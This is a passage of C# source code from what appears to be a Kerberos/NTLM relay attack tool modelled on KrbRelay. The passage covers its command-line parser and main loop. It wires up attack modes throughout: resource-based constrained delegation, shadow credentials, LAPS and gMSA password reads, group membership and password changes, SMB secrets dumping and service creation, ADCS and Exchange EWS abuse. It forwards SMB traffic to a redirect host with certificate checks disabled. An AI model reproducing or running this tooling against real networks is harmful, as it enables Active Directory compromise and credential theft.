                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                    case "-BGCONSOLE":
                    case "/BGCONSOLE":
                        bgconsole = true;
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                    // ldap attacks
                    case "-RBCD":
                    case "/RBCD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("rbcd", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            try
                            {
                                if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                    throw new Exception();
                                attacks.Add("rbcd", args[entry.index + 1] + " " + "");
                            }
                            catch
                            {
                                Console.WriteLine("[-] -rbcd requires an argument");
                                return;
                            }
                        }
                        break;

                    case "-SHADOWCRED":
                    case "/SHADOWCRED":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("shadowcred", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("shadowcred", "");
                        }
                        break;

                    case "-LAPS":
                    case "/LAPS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("laps", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("laps", "");
                        }
                        break;

                    case "-GMSA":
                    case "/GMSA":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("gmsa", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("gmsa", "");
                        }
                        break;

                    case "-ADD-GROUPMEMBER":
                    case "/ADD-GROUPMEMBER":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("add-groupmember", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-groupmember requires two arguments");
                            return;
                        }
                        break;

                    case "-RESET-PASSWORD":
                    case "/RESET-PASSWORD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("reset-password", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -reset-password requires two arguments");
                            return;
                        }
                        break;

                    // smb attacks
                    case "-LIST":
                    case "/LIST":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("list", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("list", "");
                        }
                        break;

                    case "-UPLOAD":
                    case "/UPLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("upload", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -upload requires an argument");
                            return;
                        }
                        break;

                    case "-DOWNLOAD":
                    case "/DOWNLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("download", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -download requires an argument");
                            return;
                        }
                        break;

                    case "-SECRETS":
                    case "/SECRETS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("secrets", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("secrets", "");
                        }
                        break;

                    case "-ADD-PRIVILEGES":
                    case "/ADD-PRIVILEGES":
                        try
                        {
                            attacks.Add("add-privileges", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-privileges requires an argument");
                            return;
                        }
                        break;

                    case "-SERVICE-ADD":
                    case "/SERVICE-ADD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("service-add", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -service-add requires two arguments");
                            return;
                        }
                        break;

                    case "-ADD-PRINTERDRIVER":
                    case "/ADD-PRINTERDRIVER":
                        try
                        {
                            attacks.Add("add-priverdriver", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-priverdriver requires an argument");
                            return;
                        }
                        break;

                    // http attacks
                    case "-ENDPOINT":
                    case "/ENDPOINT":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("endpoint", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -endpoint requires an argument");
                            return;
                        }
                        break;

                    case "-ADCS":
                    case "/ADCS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("adcs", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -adcs requires an argument");
                            return;
                        }
                        break;

                    case "-PROXY":
                    case "/PROXY":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("proxy", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("proxy", "");
                        }
                        break;

                    case "-EWS-CONSOLE":
                    case "/EWS-CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("ews-console", "");
                        }
                        break;

                    case "-EWS-DELEGATE":
                    case "/EWS-DELEGATE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-delegate", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-delegate requires an argument");
                            return;
                        }
                        break;

                    case "-EWS-SEARCH":
                    case "/EWS-SEARCH":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-search", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-search requires an argument");
                            return;
                        }
                        break;

                    //optional
                    case "-H":
                    case "/H":
                        show_help = true;
                        break;

                    
                    case "-SPN":
                    case "/SPN":
                        spn = args[entry.index + 1];
                        break;

                   

                    case "-RELAYEDUSER":
                    case "/RELAYEDUSER":
                        relayedUser = args[entry.index + 1];
                        break;
                    case "-RELAYEDUSERDOMAIN":
                    case "/RELAYEDUSERDOMAIN":
                        relayedUserDomain = args[entry.index + 1];
                        break;
                    case "-SESSION":
                    case "/SESSION":
                        sessionID = Int32.Parse(args[entry.index + 1]);
                        break;
                }
            }

            if (show_help)
            {
                ShowHelp();
                return;
            }

            if (string.IsNullOrEmpty(spn) && ntlm == false)
            {
                Console.WriteLine("Missing /spn: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }

            /*if (string.IsNullOrEmpty(clsid))
            {
                Console.WriteLine("Missing /clsid: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }*/

            if (!string.IsNullOrEmpty(spn))
            {
                service = spn.Split('/').First().ToLower();
                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
                {
                    Console.WriteLine("'{0}' service not supported", service);
                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
                    return;
                }
                string[] d = spn.Split('.').Skip(1).ToArray();
                domain = string.Join(".", d);

                string[] dd = spn.Split('/').Skip(1).ToArray();

                targetFQDN = string.Join(".", dd);

            }
            service = spn.Split('/').First();
            if (!string.IsNullOrEmpty(domain))
            {
                var domainComponent = domain.Split('.');
                foreach (string dc in domainComponent)
                {
                    domainDN += string.Concat(",DC=", dc);
                }
                domainDN = domainDN.TrimStart(',');
            }

            if (!string.IsNullOrEmpty(clsid))
                clsId_guid = new Guid(clsid);

            //
            //setUserData(sessionID);
            string pPrincipalName;
            if (FakeSPN == "")
                pPrincipalName = spn;
            else
                pPrincipalName = FakeSPN;

            if (service == "cifs")
            {
                //bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
                //if (!isConnected)
                //{
//                  Console.WriteLine("[-] Could not connect to {0}:445", targetFQDN);
  //               return;
    //            }
                //Smb.Connect();

                //Console.WriteLine("smc conn done");
                //Console.ReadKey();
            }
            if (service == "http")
            {
                if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
                {
                    Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                    return;
                }
                //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };

                httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                string transport = "http";
                if (useSSL)
                {
                    transport = "https";
                }
                httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));

            }

            //Console.WriteLine("[*] Socket Server Start: {0}", ListenerPort);
            //tcpFwd.StartPortFwd("192.168.1.79", "445", "192.168.212.44", "445");
            //tcpFwd = new PortForwarder2(445, RedirectHost, 445);
            SMBtcpFwd = new PortForwarder2(445, RedirectHost, 445, "SMB");
            SMBtcpFwd.Start(false);
            /*DCOMtcpFwd = new PortForwarder2(9999, RedirectHost, 135, "DCOM");
            Task.Run(() => DCOMtcpFwd.Start(false));*/

            List<PortForwarder2> tcpForwarders = new List<PortForwarder2>();

            if (RedirectPorts != null)
            {
                foreach (string item in RedirectPorts)
                {

                    tcpForwarders.Add(new PortForwarder2(int.Parse(item), RedirectHost, int.Parse(item)));
                }
                foreach (PortForwarder2 item in tcpForwarders)
                {
                    item.Start(true);
                }
            }

            Console.WriteLine("[*] Hit 'q' for quit, 'r' for restarting Relaying and Port Forwarding, 'l' for listing connected clients");
            while (true)
            {
                //StartListener().Wait();
                //Console.WriteLine("Returned");
                //tcpFwd.Stop();
                if (Console.KeyAvailable)
                {
                    // Read the key without blocking
                    ConsoleKeyInfo key = Console.ReadKey(intercept: true); // 'true' prevents the key from appearing in the console
                    if(key.KeyChar=='q')
                        return;

                    if (key.KeyChar == 'l')
                    {
                        SMBtcpFwd.ListConnectedClients();
                        
                    }
                    if (key.KeyChar == 's')
                    {
                        relayed = !relayed;
                        Console.WriteLine(!relayed ? "[*] Relay is active" : "[*] Relay is inactive");
                        
                    }

                    if (key.KeyChar == 'r')
                    {
                        Console.WriteLine("[!] Restarting Relay...");
                        Program.relayed = false;

                        SMBtcpFwd.Stop();
                        SMBtcpFwd.Start(false);
                        
                    }
                    else
                    {
                        // Sleep for a short duration
                        //Console.WriteLine("No key pressed. Sleeping...");
                        Thread.Sleep(500); // Sleep for 1 second
                    }
                }
            }

        }
    }
}